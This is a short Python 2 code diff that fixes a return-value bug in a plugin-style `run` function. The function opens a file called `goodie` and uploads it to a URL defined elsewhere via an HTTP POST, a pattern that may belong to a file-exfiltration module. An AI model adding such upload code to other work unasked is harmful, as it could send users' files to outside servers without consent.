@@ -7,6 +7,6 @@ def run(**args):
       files = {'file': open(goodie,'rb')}
       r=requests.post(url,files=files)
       ta = "ok"
-      return str(ok)
+      return str(ta)
   except Exception, e:
       return str(e)
